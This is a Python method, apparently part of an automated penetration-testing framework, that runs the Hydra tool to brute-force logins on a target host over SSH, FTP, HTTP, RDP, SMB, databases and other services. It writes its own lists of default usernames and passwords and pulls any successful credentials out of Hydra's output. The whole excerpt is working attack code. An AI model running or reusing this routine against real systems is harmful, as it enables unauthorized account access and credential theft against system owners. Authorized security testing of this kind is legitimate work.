    def _run_hydra(self, attack: dict) -> dict:
        port    = attack.get("port", 22)
        service = attack.get("service", "ssh").lower()
        options = attack.get("options", {})

        userlist = "/usr/share/wordlists/metasploit/unix_users.txt"
        passlist = "/usr/share/wordlists/metasploit/unix_passwords.txt"

        if not os.path.exists(userlist):
            userlist = f"{self.evidence_dir}/users.txt"
            with open(userlist, "w") as f:
                f.write("admin\nroot\nuser\ntest\nguest\nwww-data\n"
                        "ftp\nmsfadmin\npostgres\nmysql\nservice\n"
                        "tomcat\napache\nnobody\noperator\n")

        if not os.path.exists(passlist):
            passlist = f"{self.evidence_dir}/passwords.txt"
            with open(passlist, "w") as f:
                f.write("admin\npassword\n123456\nroot\ntoor\n"
                        "password123\nadmin123\nmsfadmin\npostgres\n"
                        "mysql\nuser\ntest\nguest\nftp\nletmein\n"
                        "master\nchangeme\n1234\ndefault\nservice\n"
                        "tomcat\napache\npasswd\nqwerty\n")

        try:
            protocol_map = {
                "ssh": "ssh", "ftp": "ftp",
                "http": "http-get", "https": "https-get",
                "smtp": "smtp", "mysql": "mysql",
                "postgres": "postgres", "postgresql": "postgres",
                "mssql": "mssql", "rdp": "rdp", "vnc": "vnc",
                "telnet": "telnet", "smb": "smb",
            }
            protocol = protocol_map.get(service, service)

            cmd = [
                "hydra",
                "-L", userlist, "-P", passlist,
                "-t", "4", "-f", "-V",
                self.target, protocol,
                "-s", str(port),
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            output  = result.stdout + result.stderr
            success = "login:" in output.lower() and "password:" in output.lower()
            creds   = [l.strip() for l in output.splitlines()
                       if "login:" in l.lower() and "password:" in l.lower()]

            return {
                "success": success, "output": output[:3000],
                "credentials": creds, "service": service, "port": port
            }

        except FileNotFoundError:
            return {"success": False, "output": "[ERROR] hydra not installed"}
        except subprocess.TimeoutExpired:
            return {"success": False, "output": "[TIMEOUT] Hydra exceeded 5 minutes"}
        except Exception as e:
            return {"success": False, "output": f"Hydra error: {str(e)}"}

